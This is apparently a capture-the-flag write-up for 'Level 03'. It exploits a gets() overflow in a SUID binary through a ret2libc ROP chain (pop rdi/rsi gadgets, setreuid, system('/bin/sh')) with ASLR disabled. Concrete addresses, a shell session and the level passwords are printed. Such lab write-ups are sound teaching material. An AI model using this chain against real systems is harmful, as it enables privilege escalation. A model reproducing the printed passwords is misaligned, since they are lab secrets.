# Level 03

qeplvibynup98phqb312dkvhtpdkklac

## Description

```
$ ls -l
total 28
-rwsr-x--- 1 flag03  level03 16512 Jun  9 23:13 armitage
-r--r--r-- 1 level03 level03  1823 Jun  9 23:13 armitage.c
-r--r--r-- 1 level03 level03    37 Jun  9 23:13 README
```

```
readelf -l armitage
...
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
```

This time the stack is not executable, so injecting shellcode inside environment or inside stack frame is not an option.

## armitage.c

### queue_job() function

```
char msg[MSG_SIZE];
...
gets(msg);
...
if (!validate_job(msg)) { // Buffer must start  with "JOB"
    ...
    return;
}

```

The program use  `gets()` to store data so we can replace the return address of this function.

## The exploit: the ret2libc attack

Because the stack is not executable, adding our own shellcode **is not an option**. 
We need to exploit code already present in the executable.

The common attach for non-executable stack situation seems to be the `ret2libc`.

### system() address is predictible

The idea is to benefit from the fact that, when ASLR is disabled, the addresses of the libc functions will be predictable at runtime, and particularly: the `system()` function.

Let's demonstrate this using a simple program:
```
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("address of system(%p)\n", &system);
    return (0);
}
```
Output:
```
./a.out 
address of system(0x7ffff7c58750)
./a.out 
address of system(0x7ffff7c58750)
./a.out  pouet
address of system(0x7ffff7c58750)
```

Not only the address is static accross runs but it is not influenced by the stack layout caused by different launch context.

The reason for this, is that `ldd`, the linux loader, will always map the `libc` at the same address (when no ASLR) :
```
ldd test 
	linux-vdso.so.1 (0x00007ffff7fc3000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc5000)
```

Because the symbols also have a fixed offset inside the libc, we can compute the address of the `system()` function:
```
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep ' system'
  1050: 0000000000058750    45 FUNC    WEAK   DEFAULT   17 system@@GLIBC_2.2.5
```

> 0x7ffff7c00000 + 0x58750 = **0x7ffff7c58750**

### How to pass arguments ?

Okay, so because we know address of `system()` and we can't replace the `queue_job()` return address with it, we can easily run the `system()` function.

But how to pass the arguments to the functions ? That is `cat /home/level03/.pass`.

We can store the string argument on the stack but we needs to assign $rdi the address of the string in order for the exploit to works.

The solution for this is to find what we call a **pop gadget**.

> The **pop gadget** refers to a sequence of instruction **already** present in an executable segment of the program (either in the source code itself or in a loladed library).
> 
> The effect of the pop gadget is usually to pop a saved register from the stack and return immediately after. Example :
> ```
> pop rax; Restore rax register from stack
> ret; Restore saved rip from stack and return to it
> ``` 
> The pop gadget address must be resolved prior to the attack.

In this case, we are interesting in finding a **pop rdi gadget**.

`find_gadget.py` script will look for these pop gadgets inside both the `armitage` program and the `libc` :
```
python3 ./find_gadget.py 
...
 gadget in armitage executable: 0x0
...
 gadget in libc: 0x10f84b
```

We have found a relevant gadget in the libc at address **`0x10f84b`**.

If we check this address against the libc sections, we can confirm it is located in the **.text** section and thus it is executable.

```
readelf -S /lib/x86_64-linux-gnu/libc.so.6
...
  [17] .text             PROGBITS         0000000000028800  00028800
       0000000000187839  0000000000000000  AX       0     0     64
```

In `armitage` program, it will be mapped at runtime to the address `0x7ffff7c00000 + 0x10f84b` = **`0x7ffff7d0f84b`**.

Using these **pop gadgets** in chain is called **ROP** (Return Oriented Programming), and chaining them creates a **ROP chain**.

### Caveats

#### Stack alignment

At function entry, x86-64 ABI convention expects a 16-byte stack alignment such as `$rsp % 16 = 8`. The reason for this is that  $rbp will be pushed into the stack at function entry and thus $rsp will be aligned on 16-bytes.

This can be inspected in gdb:
```
b *main => will set breakpoint at function prologue where `$rsp % 16 = 8`
b main => will set breakpoint after function prologue where `$rsp % 16 = 0`
```

When using gadgets and when performing successive **ret** without **call** instruction in between, stack alignment will be broken, and this is very likely to break following functions calls from libc.

This is the reason why the number of stack registers that will be popped from the stack along a **ROP chain** must be **odd** (not counting the normal return which is hijacked)

```
[system_ret]        <- ret(=pop) (3)
[ret_gadget_ret]    <- ret(=pop) (2)
[string_addr]       <- pop       (1)
[pop_rdi_gadget_ret]<- ret(=pop) (0)
```

#### Stack-data volatility

Although it is tempting to store libc functions argument directly in the overflowed-buffer, it is likely that these data will be overriden by the subsequent libc functions called.

Here are the different option for finding argument:
- storing them in environment (resolve address with gdb or custom program)
- storing them in argv (resolve address using gdb or custom program)
- finding them in the existant code or library (for example, if the argument is /bin/sh, it is likely that the libc will already provide this string).

#### system() and SUID

If we run `system("cat /home/flag03/.pass)` and inspect what happens with strace:
```
[pid  5261] execve("/bin/sh", ["sh", "-c", "--", "cat /home/flag03/.pass"], 0x7fffffffee20 /* 0 vars */ <unfinished ...>
```

We can see `system()` will execute /bin/sh (which resolve to /usr/bin/dash) without the `-p` argument needed to transfert the SUID effect.

We can either:
- use `execve()` from libc instead of `system()` and provides it with `["/usr/bin/bash", "-p"]` argument
  - The string array argument would have to be built in the environment or in argv[]
  - We need 2 gadgets for argument (`"pop rdi; ret"` and `"pop rsi; ret"`) + 1 gadget for alignment (`ret`)
- use `setreuid` from libc before `system()` to change the real UID of the process to the effective UID
  - the arguments would be in the ROP chain and we'll need 2 gadgets: one `"pop rdi; ret"` for both the `system()` call and the `setuid()` call and a `"pop rsi; ret"` for the 2nd argument

### Exploit summary

The idea is to first transfer the effective UID to the real UID for it to persist after system() call, using `setuid()` function.

Then, we call `system("/bin/sh")` and we get a shell from which we can read the flag.

Everything is done using **ROP chain**. Even the /bin/sh string argument is found from libc.

Let's visualize how the exploit will works :

```
[ret_addr: pop rdi gadget] <- ret(=pop) (0)
[arg1: UID of flag03]      <- pop       (1)
[ret_addr: pop rsi gadget] <- ret       (2)
[arg1: UID of flag03]      <- pop       (3)
[ret_addr: setreuid]       <- ret       (4)
[ret_addr: pop rdi gadget] <- ret       (5)
[arg1: addr of /bin/sh]    <- pop       (6)
[ret_addr: system]         <- ret       (7)
```

With resolved address:

```
[ret_addr: pop rdi gadget] 0x7ffff7d0f84b
[arg1: UID of flag03] 1020
[ret_addr: pop rsi gadget] 0x7ffff7d10b3d
[arg1: UID of flag03] 1020
[ret_addr: setreuid] 0x7ffff7d27330
[ret_addr: pop rdi gadget] 0x7ffff7d0f84b
[arg1: addr of /bin/sh] 0x7ffff7dcc42f
[ret_addr: system] 0x7ffff7c58750
```

Run the exploit
```
python3 exploit.py
$ whoami
flag03
$ cat /home/flag03/.pass
8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```
